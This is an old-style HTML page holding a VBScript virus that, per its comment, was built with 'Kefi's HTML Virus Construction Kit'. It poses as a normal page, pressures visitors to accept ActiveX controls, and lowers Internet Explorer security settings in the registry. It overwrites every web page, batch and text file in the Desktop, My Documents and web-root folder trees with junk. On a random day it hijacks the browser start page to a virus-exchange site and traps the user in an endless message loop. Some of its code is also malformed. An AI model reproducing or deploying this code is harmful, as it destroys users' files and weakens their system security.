<HTML><BODY>
<script language = "JavaScript">
<!--
var userAgent=navigator.appName;
var agentInfo=userAgent.substring(0, 1);
if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer.")
self.close()
}
//-->
</script>
<script language ="vbscript">
On Error Resume Next
MsgBox "To Veiw This Page, Please" & vbCrLf & "Accept The ActiveX Controlls", vbInformation, "Internet Explorer Warning!"
Set shell=CreateObject("WScript.Shell")
If err.number=429 then
shell.Run javascript:location.reload()
else
'html.jkhg
'by jkg
'created with Kefi's HTML Virus Construction Kit 1.5
Dim Shell, Fso
On Error Resume Next
Set Fso = CreateObject("scripting.filesystemobject")
Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, " REG_DWORD"
Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, " REG_DWORD"
InfectFolder("C:\Windows\Desktop")
InfectFolder("C:\My Documents")
InfectFolder("C:\Inetpub\wwwroot")
InfectFolder("C:\Program Files\SoftIce\EZpad 3.0\templates")
If Day(Now()) = Int(Rnd * 7) + 1 Then
Shell.RegWrite " HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Kefi"
Shell.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start_Page", "Http://vx.netlux.org/~kefi"
Shell.run"Http://vx.netlux.org/~kefi"
Do
MsgBox "You arn't very smart...." ,Critical, "^_^"
Loop
End If
Sub InfectFolder(ifp)
Do
Set FolderObj = Fso.GetFolder(ifp)
ifp = Fso.GetParentFolderName(ifp)
Set FO = FolderObj.Files
For Each NewFile In FO
extname = LCase(Fso.GetExtensionName(NewFile.Name))
Set FileDropper = Fso.createtextfile(NewFile.Path)
If extname = "htm"Then
FileDropper.writeline "<HTML><HEAD><TITLE>jkhg</TITLE></HEAD><BODY BGCOLOR="#FFFFFF"TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size="1">a message from jkg</font></CENTER></BODY></HTML>
End If
If extname = "html"Then
FileDropper.writeline "<HTML><HEAD><TITLE>jkhg</TITLE></HEAD><BODY BGCOLOR="#FFFFFF"TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size="1">a message from jkg</font></CENTER></BODY></HTML>
End If
If extname = "hta"Then
FileDropper.writeline "<HTML><HEAD><TITLE>jkhg</TITLE></HEAD><BODY BGCOLOR="#FFFFFF"TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size="1">a message from jkg</font></CENTER></BODY></HTML>
End If
If extname = "htx"Then
FileDropper.writeline "<HTML><HEAD><TITLE>jkhg</TITLE></HEAD><BODY BGCOLOR="#FFFFFF"TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size="1">a message from jkg</font></CENTER></BODY></HTML>
End If
If extname = "asp"Then
FileDropper.writeline "<HTML><HEAD><TITLE>jkhg</TITLE></HEAD><BODY BGCOLOR="#FFFFFF"TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size="1">a message from jkg</font></CENTER></BODY></HTML>
End If
If extname = "bat"Then
FileDropper.Write "This was infected with Pookins"
End If
If extname = "txt"Then
FileDropper.Write "This was infected with Pookins"
End If
FileDropper.Close
End If
Next
Loop Until FolderObj.IsRootFolder = True
End Sub
--></script></BODY></HTML>
<HTML><HEAD><TITLE>jkhg</TITLE></HEAD><BODY BGCOLOR="#FFFFFF" TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size="5">Don't forget your Pajamas</font><BR><font size="1">a message from jkg</font></CENTER></BODY></HTML>
